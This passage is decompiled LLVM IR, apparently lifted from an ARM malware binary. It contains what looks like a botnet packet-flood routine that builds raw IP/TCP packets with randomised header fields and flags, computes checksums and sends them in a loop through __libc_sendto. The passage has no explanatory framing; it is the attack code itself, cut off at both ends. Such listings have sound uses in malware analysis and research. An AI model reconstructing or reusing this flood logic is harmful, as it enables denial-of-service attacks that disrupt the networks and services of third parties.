  %v2_9dc4 = load i8, i8* %v1_9dc4, align 1
  %tmp103 = urem i8 %v2_9dc4, 16
  %v1_9dc8 = zext i8 %tmp103 to i32
  %v1_9dcc = or i32 %v1_9dc8, 64
  store i32 %v1_9dcc, i32* %r3.global-to-local, align 4
  %v1_9dd0 = trunc i32 %v1_9dcc to i8
  store i8 %v1_9dd0, i8* %v1_9dc4, align 1
  %v0_9dd4 = load i32, i32* @r4, align 4
  %v1_9dd4 = inttoptr i32 %v0_9dd4 to i8*
  %v2_9dd4 = load i8, i8* %v1_9dd4, align 1
  %v0_9dd8 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_9dd8, 256
  %v1_9de0 = and i8 %v2_9dd4, -16
  %v1_9de4 = or i8 %v1_9de0, 5
  %v1_9de8 = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.33 to i32), i32 16776960)
  %tmp78 = udiv i32 %v0_9dd8, 256
  %v4_9dec = urem i32 %tmp78, 256
  %v5_9dec = or i32 %v4_9dec, %v1_9de8
  store i32 %v5_9dec, i32* %r2.global-to-local, align 4
  %v0_9df0 = load i32, i32* @fp, align 4
  %v1_9df0 = urem i32 %v0_9df0, 256
  store i32 %v1_9df0, i32* %r0.global-to-local, align 4
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v3_9df8 = udiv i32 %v0_9df0, 256
  store i32 %v3_9df8, i32* %r1.global-to-local, align 4
  store i8 %v1_9de4, i8* %v1_9dd4, align 1
  %v0_9e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e00 = load i32, i32* %r0.global-to-local, align 4
  %v4_9e00 = mul i32 %v1_9e00, 256
  %v5_9e00 = or i32 %v4_9e00, %v0_9e00
  store i32 %v5_9e00, i32* %r1.global-to-local, align 4
  store i32 %v6_9940, i32* %r0.global-to-local, align 4
  %v2_9e08 = load i32, i32* @r4, align 4
  %v3_9e08 = add i32 %v2_9e08, 1
  %v4_9e08 = inttoptr i32 %v3_9e08 to i8*
  store i8 %v5_9960, i8* %v4_9e08, align 1
  %v0_9e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9e0c = trunc i32 %v0_9e0c to i16
  %v2_9e0c = load i32, i32* @r4, align 4
  %v3_9e0c = add i32 %v2_9e0c, 4
  %v4_9e0c = inttoptr i32 %v3_9e0c to i16*
  store i16 %v1_9e0c, i16* %v4_9e0c, align 2
  %v0_9e10 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e10 = icmp eq i32 %v0_9e10, 0
  store i1 %v2_9e10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_999c, i32* %r1.global-to-local, align 4
  %v0_9e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i16
  %v2_9e18 = load i32, i32* @r4, align 4
  %v3_9e18 = add i32 %v2_9e18, 2
  %v4_9e18 = inttoptr i32 %v3_9e18 to i16*
  store i16 %v1_9e18, i16* %v4_9e18, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9e10, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_9d3c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_9d3c, %bb79
  %v0_9e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e24 = trunc i32 %v0_9e24 to i8
  %v2_9e24 = load i32, i32* @r4, align 4
  %v3_9e24 = add i32 %v2_9e24, 8
  %v4_9e24 = inttoptr i32 %v3_9e24 to i8*
  store i8 %v1_9e24, i8* %v4_9e24, align 1
  %v0_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i8
  %v2_9e28 = load i32, i32* @r4, align 4
  %v3_9e28 = add i32 %v2_9e28, 9
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  %v0_9e2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e2c, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_9e2c = trunc i32 %v1_9e2c to i16
  %v3_9e2c = load i32, i32* @r4, align 4
  %v4_9e2c = add i32 %v3_9e2c, 6
  %v5_9e2c = inttoptr i32 %v4_9e2c to i16*
  store i16 %v2_9e2c, i16* %v5_9e2c, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32* %r2.global-to-local, align 4
  %v2_9e34 = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_9e34, i32* %r1.global-to-local, align 4
  %v1_9e38 = load i32, i32* @r4, align 4
  %v2_9e38 = add i32 %v1_9e38, 12
  %v3_9e38 = inttoptr i32 %v2_9e38 to i32*
  store i32 %v2_9e34, i32* %v3_9e38, align 4
  %v3_9e3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v4_9e44 = mul i32 %v3_9e3c, 16
  %v5_9e44 = add i32 %v4_9e44, %v2_9918
  %v6_9e44 = inttoptr i32 %v5_9e44 to i32*
  %v7_9e44 = load i32, i32* %v6_9e44, align 4
  store i32 %v7_9e44, i32* %r2.global-to-local, align 4
  store i32 %v5_9e44, i32* %r3.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, 16
  %v3_9e50 = inttoptr i32 %v2_9e50 to i32*
  store i32 %v7_9e44, i32* %v3_9e50, align 4
  %v0_9e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 12
  %v2_9e54 = inttoptr i32 %v1_9e54 to i16*
  %v3_9e54 = load i16, i16* %v2_9e54, align 2
  %v4_9e54 = zext i16 %v3_9e54 to i32
  store i32 %v4_9e54, i32* %r0.global-to-local, align 4
  %v1_9e58 = add i32 %v0_9e54, 8
  %v2_9e58 = inttoptr i32 %v1_9e58 to i32*
  %v3_9e58 = load i32, i32* %v2_9e58, align 4
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v2_9e5c = load i32, i32* @r4, align 4
  %v3_9e5c = add i32 %v2_9e5c, 20
  %v4_9e5c = inttoptr i32 %v3_9e5c to i16*
  store i16 %v3_9e54, i16* %v4_9e5c, align 2
  %v0_9e60 = load i32, i32* @r4, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r8, align 4
  %v1_9e64 = add i32 %v0_9e60, 33
  %v2_9e64 = inttoptr i32 %v1_9e64 to i8*
  %v3_9e64 = load i8, i8* %v2_9e64, align 1
  %v4_9e64 = zext i8 %v3_9e64 to i32
  store i32 %v4_9e64, i32* %r2.global-to-local, align 4
  %v0_9e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e68 = add i32 %v0_9e60, 24
  %v3_9e68 = inttoptr i32 %v2_9e68 to i32*
  store i32 %v0_9e68, i32* %v3_9e68, align 4
  %v0_9e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e6c = or i32 %v0_9e6c, 1
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v0_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e70 = add i32 %v0_9e70, 4
  %v2_9e70 = inttoptr i32 %v1_9e70 to i32*
  %v3_9e70 = load i32, i32* %v2_9e70, align 4
  store i32 %v3_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e70, 14
  %v2_9e74 = inttoptr i32 %v1_9e74 to i16*
  %v3_9e74 = load i16, i16* %v2_9e74, align 2
  %v4_9e74 = zext i16 %v3_9e74 to i32
  store i32 %v4_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v1_9e6c to i8
  %v2_9e78 = load i32, i32* @r8, align 4
  %v3_9e78 = add i32 %v2_9e78, 13
  %v4_9e78 = inttoptr i32 %v3_9e78 to i8*
  store i8 %v1_9e78, i8* %v4_9e78, align 1
  %v0_9e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e7c = trunc i32 %v0_9e7c to i16
  %v2_9e7c = load i32, i32* @r8, align 4
  %v3_9e7c = add i32 %v2_9e7c, 2
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 %v1_9e7c, i16* %v4_9e7c, align 2
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 12
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v4_9e80, i32* %r3.global-to-local, align 4
  %v1_9e84 = add i32 %v0_9e80, 13
  %v2_9e84 = inttoptr i32 %v1_9e84 to i8*
  %v3_9e84 = load i8, i8* %v2_9e84, align 1
  %v4_9e84 = zext i8 %v3_9e84 to i32
  %tmp104 = urem i8 %v3_9e80, 16
  %v1_9e88 = zext i8 %tmp104 to i32
  %v1_9e8c = or i32 %v1_9e88, 128
  store i32 %v1_9e8c, i32* %r3.global-to-local, align 4
  %v1_9e90 = or i32 %v4_9e84, 16
  store i32 %v1_9e90, i32* %r2.global-to-local, align 4
  %v0_9e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e94 = add i32 %v0_9e80, 8
  %v3_9e94 = inttoptr i32 %v2_9e94 to i32*
  store i32 %v0_9e94, i32* %v3_9e94, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r8, align 4
  %v3_9e98 = add i32 %v2_9e98, 12
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e9c = trunc i32 %v0_9e9c to i8
  %v2_9e9c = load i32, i32* @r8, align 4
  %v3_9e9c = add i32 %v2_9e9c, 13
  %v4_9e9c = inttoptr i32 %v3_9e9c to i8*
  store i8 %v1_9e9c, i8* %v4_9e9c, align 1
  %v0_9ea0 = call i32 @rand_next()
  %v1_9ea0 = trunc i32 %v0_9ea0 to i16
  store i32 %v0_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r8, align 4
  %v1_9ea8 = add i32 %v0_9ea8, 13
  %v2_9ea8 = inttoptr i32 %v1_9ea8 to i8*
  %v3_9ea8 = load i8, i8* %v2_9ea8, align 1
  %v4_9ea8 = zext i8 %v3_9ea8 to i32
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v1_9eb0 = and i32 %v4_9ea8, 223
  %v5_9eb4 = or i32 %v1_9eb0, %v4_9eb4
  store i32 %v5_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = trunc i32 %v5_9eb4 to i8
  store i8 %v1_9eb8, i8* %v2_9ea8, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9ec0 = load i32, i32* @r8, align 4
  %v1_9ec0 = add i32 %v0_9ec0, 13
  %v2_9ec0 = inttoptr i32 %v1_9ec0 to i8*
  %v3_9ec0 = load i8, i8* %v2_9ec0, align 1
  %v4_9ec0 = zext i8 %v3_9ec0 to i32
  store i32 %v1_9ec4, i32* %r3.global-to-local, align 4
  %v1_9ec8 = and i32 %v4_9ec0, 239
  %v5_9ecc = or i32 %v1_9ec8, %v4_9ecc
  store i32 %v5_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = trunc i32 %v5_9ecc to i8
  store i8 %v1_9ed0, i8* %v2_9ec0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r8, align 4
  %v1_9ed8 = add i32 %v0_9ed8, 13
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v1_9edc, i32* %r2.global-to-local, align 4
  %v1_9ee0 = and i32 %v4_9ed8, 247
  %v5_9ee4 = or i32 %v1_9ee0, %v4_9ee4
  store i32 %v5_9ee4, i32* %r3.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v5_9ee4 to i8
  store i8 %v1_9ee8, i8* %v2_9ed8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r8, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 13
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef0 = load i8, i8* %v2_9ef0, align 1
  %v4_9ef0 = zext i8 %v3_9ef0 to i32
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  %v1_9ef8 = and i32 %v4_9ef0, 251
  %v5_9efc = or i32 %v1_9ef8, %v4_9efc
  store i32 %v5_9efc, i32* %r2.global-to-local, align 4
  %v1_9f00 = trunc i32 %v5_9efc to i8
  store i8 %v1_9f00, i8* %v2_9ef0, align 1
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  %v0_9f08 = load i32, i32* @r8, align 4
  %v1_9f08 = add i32 %v0_9f08, 13
  %v2_9f08 = inttoptr i32 %v1_9f08 to i8*
  %v3_9f08 = load i8, i8* %v2_9f08, align 1
  %v4_9f08 = zext i8 %v3_9f08 to i32
  store i32 %v1_9f0c, i32* %r2.global-to-local, align 4
  %v1_9f10 = and i32 %v4_9f08, 253
  %v4_9f14 = or i32 %v1_9f10, %v3_9f14
  store i32 %v4_9f14, i32* %r3.global-to-local, align 4
  %v1_9f18 = trunc i32 %v4_9f14 to i8
  store i8 %v1_9f18, i8* %v2_9f08, align 1
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r8, align 4
  %v1_9f20 = add i32 %v0_9f20, 13
  %v2_9f20 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f20 = load i8, i8* %v2_9f20, align 1
  %v4_9f20 = zext i8 %v3_9f20 to i32
  %v1_9f28 = and i32 %v4_9f20, 254
  store i32 %v1_9f28, i32* %r2.global-to-local, align 4
  %v2_9f2c = or i32 %v1_9f28, %v1_9f24
  store i32 %v2_9f2c, i32* %r3.global-to-local, align 4
  %v1_9f30 = trunc i32 %v2_9f2c to i8
  store i8 %v1_9f30, i8* %v2_9f20, align 1
  %v3_9f34 = load i32, i32* @r8, align 4
  %v4_9f34 = add i32 %v3_9f34, 14
  %v5_9f34 = inttoptr i32 %v4_9f34 to i16*
  store i16 %v1_9ea0, i16* %v5_9f34, align 2
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r4, align 4
  %v1_9f3c = add i32 %v0_9f3c, 40
  store i32 %v1_9f3c, i32* %r0.global-to-local, align 4
  %v2_9f40 = inttoptr i32 %v1_9f3c to i16*
  %v3_9f40 = call i32 @rand_str(i16* %v2_9f40, i32 %v6_9a9c)
  store i32 %v3_9f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c94

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9b08
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a9c, 40
  br label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9f48
  %storemerge6.pre-phi = phi i32 [ %v1_9d98, %dec_label_pc_9ca8 ], [ %.pre, %dec_label_pc_9f48 ]
  %v0_9f6c26 = phi i32 [ %v1_9c9c, %dec_label_pc_9ca8 ], [ 0, %dec_label_pc_9f48 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a9c, 65536
  %storemerge = add i32 %v6_9a9c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f58 = add i32 %storemerge4, 1310720
  store i32 %v1_9f58, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_9f58, 256
  %v3_9f60 = and i32 %tmp83, 65280
  store i32 %v3_9f60, i32* %r3.global-to-local, align 4
  %v4_9f64 = udiv i32 %v1_9f58, 16777216
  %v5_9f64 = or i32 %v3_9f60, %v4_9f64
  store i32 %v5_9f64, i32* @r8, align 4
  %v2_a090 = icmp eq i32 %v1_9abc, 0
  br label %dec_label_pc_9f68

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074, %dec_label_pc_9f58
  %v0_9f6c = phi i32 [ %v0_9f6c26, %dec_label_pc_9f58 ], [ 0, %dec_label_pc_a074 ], [ 0, %dec_label_pc_9f68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f6c = icmp eq i32 %v0_9f6c, 0
  store i1 %v2_9f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f6c, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f78
  %v1_9f84 = phi i32 [ %v1_a064, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9f78 ]
  store i32 %v2_9928, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9f84 = mul i32 %v1_9f84, 4
  %v5_9f84 = add i32 %v4_9f84, %v2_9928
  %v6_9f84 = inttoptr i32 %v5_9f84 to i32*
  %v7_9f84 = load i32, i32* %v6_9f84, align 4
  store i32 %v7_9f84, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9f8c = load i32, i32* @fp, align 4
  %v9_9f8c = icmp eq i32 %v0_9f8c, 65535
  store i1 %v9_9f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f90 = add i32 %v7_9f84, 20
  store i32 %v1_9f90, i32* @r5, align 4
  br i1 %v9_9f8c, label %dec_label_pc_a088, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f7c
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a09c

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_a088, %dec_label_pc_a09c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9fa8 = load i32, i32* @r4, align 4
  %v3_9fa8 = add i32 %v2_9fa8, 10
  %v4_9fa8 = inttoptr i32 %v3_9fa8 to i16*
  store i16 0, i16* %v4_9fa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9fb0 = load i32, i32* @r4, align 4
  store i32 %v0_9fb0, i32* @r0, align 4
  %v2_9fb4 = call i32 @checksum_generic(i32 %v0_9fb0, i32 20)
  %v3_9fb4 = trunc i32 %v2_9fb4 to i16
  store i32 %v2_9fb4, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_9918, i32* %r2.global-to-local, align 4
  %v3_9fc0 = mul i32 %v3_9fb8, 16
  %v2_9fc4 = add i32 %v3_9fc0, %v2_9918
  store i32 %v2_9fc4, i32* %r1.global-to-local, align 4
  %v1_9fc8 = add i32 %v2_9fc4, 4
  %v2_9fc8 = inttoptr i32 %v1_9fc8 to i32*
  %v3_9fc8 = load i32, i32* %v2_9fc8, align 4
  %v3_9fcc = mul i32 %v3_9fc8, 65536
  store i32 %v3_9fcc, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_9fc8, 256
  %v1_9fd4 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.33 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_9fc8, 256
  %v4_9fd8 = urem i32 %tmp86, 256
  %v5_9fd8 = or i32 %v4_9fd8, %v1_9fd4
  store i32 %v5_9fd8, i32* %r3.global-to-local, align 4
  %v1_9fdc = add i32 %v3_9fc8, 1
  store i32 %v1_9fdc, i32* %r2.global-to-local, align 4
  store i32 %v1_9fdc, i32* %v2_9fc8, align 4
  %v0_9fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 4
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  store i32 %v0_9fe4, i32* %v3_9fe4, align 4
  %v0_9fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fe8 = add i32 %v0_9fe8, 8
  %v2_9fe8 = inttoptr i32 %v1_9fe8 to i32*
  %v3_9fe8 = load i32, i32* %v2_9fe8, align 4
  %tmp87 = mul i32 %v3_9fe8, 256
  %v1_9ff4 = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.33 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_9fe8, 256
  %v4_9ff8 = urem i32 %tmp88, 256
  %v5_9ff8 = or i32 %v4_9ff8, %v1_9ff4
  %v1_9ffc = load i32, i32* @r5, align 4
  %v2_9ffc = add i32 %v1_9ffc, 8
  %v3_9ffc = inttoptr i32 %v2_9ffc to i32*
  store i32 %v5_9ff8, i32* %v3_9ffc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a004 = load i32, i32* @r4, align 4
  %v4_a004 = add i32 %v3_a004, 10
  %v5_a004 = inttoptr i32 %v4_a004 to i16*
  store i16 %v3_9fb4, i16* %v5_a004, align 2
  %v0_a008 = load i32, i32* @r5, align 4
  store i32 %v0_a008, i32* @r1, align 4
  %v0_a00c = load i32, i32* %r3.global-to-local, align 4
  %v1_a00c = trunc i32 %v0_a00c to i16
  %v3_a00c = add i32 %v0_a008, 16
  %v4_a00c = inttoptr i32 %v3_a00c to i16*
  store i16 %v1_a00c, i16* %v4_a00c, align 2
  %v0_a010 = load i32, i32* @r8, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @sl, align 4
  store i32 %v0_a014, i32* %r3.global-to-local, align 4
  %v0_a018 = load i32, i32* @r4, align 4
  store i32 %v0_a018, i32* %r0.global-to-local, align 4
  %v4_a01c = call i32 @checksum_tcpudp(i32 %v0_a018, i32 %v0_a008, i32 %v0_a010, i32 %v0_a014)
  %v5_a01c = trunc i32 %v4_a01c to i16
  store i32 %v4_a01c, i32* %r0.global-to-local, align 4
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a028 = mul i32 %v3_a020, 32
  store i32 %v3_a028, i32* %lr.global-to-local, align 4
  %v3_a02c = load i32, i32* @r5, align 4
  %v4_a02c = add i32 %v3_a02c, 16
  %v5_a02c = inttoptr i32 %v4_a02c to i16*
  store i16 %v5_a01c, i16* %v5_a02c, align 2
  %v0_a030 = load i32, i32* %lr.global-to-local, align 4
  %v1_a030 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a030, -8
  %v5_a030 = add i32 %v0_a030, %tmp105
  store i32 %v5_a030, i32* %lr.global-to-local, align 4
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a034 = add i32 %v0_a034, 2
  %v2_a034 = inttoptr i32 %v1_a034 to i16*
  %v3_a034 = load i16, i16* %v2_a034, align 2
  %v4_a034 = zext i16 %v3_a034 to i32
  store i32 %v4_a034, i32* @r5, align 4
  %v1_a038 = load i32, i32* %ip.global-to-local, align 4
  %v2_a038 = add i32 %v1_a038, %v5_a030
  store i32 %v2_a038, i32* @lr, align 4
  %v3_a03c = add i32 %v2_a038, 2
  %v4_a03c = inttoptr i32 %v3_a03c to i16*
  store i16 %v3_a034, i16* %v4_a03c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a048 = load i32, i32* @r4, align 4
  store i32 %v0_a048, i32* %r1.global-to-local, align 4
  %v0_a04c = load i32, i32* @sb, align 4
  store i32 %v0_a04c, i32* %r0.global-to-local, align 4
  %v0_a050 = load i32, i32* @r7, align 4
  store i32 %v0_a050, i32* %r2.global-to-local, align 4
  %v0_a054 = load i32, i32* @lr, align 4
  %v6_a05c = call i32 @__libc_sendto(i32 %v0_a04c, i32 %v0_a048, i32 %v0_a050, i32 16384, i32 %v0_a054, i32 16)
  %v3_a060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a060, i32* %r3.global-to-local, align 4
  %v1_a064 = add i32 %v3_a060, 1
  store i32 %v1_a064, i32* %r0.global-to-local, align 4
  %v0_a068 = load i32, i32* @r6, align 4
  %v9_a068 = icmp eq i32 %v0_a068, %v1_a064
  store i1 %v9_a068, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a064, i32* %stack_var_-44, align 4
  %v8_a070 = icmp sgt i32 %v0_a068, %v1_a064
  br i1 %v8_a070, label %dec_label_pc_9f7c, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9fa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a078 = icmp eq i32 %v0_a068, 0
  store i1 %v2_a078, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a078, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f7c
  %v0_a088 = call i32 @rand_next()
  %v1_a088 = trunc i32 %v0_a088 to i16
  store i32 %v0_a088, i32* %r0.global-to-local, align 4
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  %v3_a094 = load i32, i32* @r4, align 4
  %v4_a094 = add i32 %v3_a094, 4
  %v5_a094 = inttoptr i32 %v4_a094 to i16*
  store i16 %v1_a088, i16* %v5_a094, align 2
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a088.dec_label_pc_a09c_crit_edge

dec_label_pc_a088.dec_label_pc_a09c_crit_edge:    ; preds = %dec_label_pc_a088
  %v0_a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a088.dec_label_pc_a09c_crit_edge, %dec_label_pc_9f98
  %v0_a09c = phi i32 [ %v0_a09c.pre, %dec_label_pc_a088.dec_label_pc_a09c_crit_edge ], [ %v7_9f84, %dec_label_pc_9f98 ]
  %v1_a09c = add i32 %v0_a09c, 40
  store i32 %v1_a09c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v2_a0a4 = inttoptr i32 %v1_a09c to i16*
  %v3_a0a4 = call i32 @rand_str(i16* %v2_a0a4, i32 %v6_9a9c)
  store i32 %v3_a0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fa4

; uselistorder directives
  uselistorder i32 %v0_a088, { 1, 0 }
  uselistorder i32 %v1_a064, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a030, { 1, 0 }
  uselistorder i32 %v4_a01c, { 1, 0 }
  uselistorder i32 %v3_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9fb4, { 1, 0 }
  uselistorder i1 %v2_a090, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9ea0, { 1, 0 }
  uselistorder i32 %v0_9dd8, { 1, 0 }
  uselistorder i32 %v3_9d74, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_9d48, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_9d2c, { 1, 0 }
  uselistorder i32 %v0_9ce8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c84, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9c10, { 1, 0 }
  uselistorder i32 %v6_9c08, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9c38, { 1, 0 }
  uselistorder i32 %v4_9c4c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b94, { 1, 0, 2 }
  uselistorder i32 %v0_9d44, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b84, { 1, 0 }
  uselistorder i1 %v7_9b7c, { 1, 0, 2 }
  uselistorder i1 %v7_9b30, { 1, 0 }
  uselistorder i32 %v3_9b2c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9f0c, { 1, 0 }
  uselistorder i32 %v1_9ef4, { 1, 0 }
  uselistorder i32 %v1_9edc, { 1, 0 }
  uselistorder i32 %v1_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v3_9c44, { 1, 0 }
  uselistorder i1 %v2_9c60, { 1, 0 }
  uselistorder i32 %v1_9c5c, { 1, 0 }
  uselistorder i32 %v4_9c58, { 2, 0, 1 }
  uselistorder i32 %v2_9b6c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9b08, { 1, 0 }
  uselistorder i1 %v7_9b00, { 1, 0 }
  uselistorder i1 %v7_9ad4, { 1, 0 }
  uselistorder i32 %v3_9ad0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9abc, { 2, 3, 1, 0 }
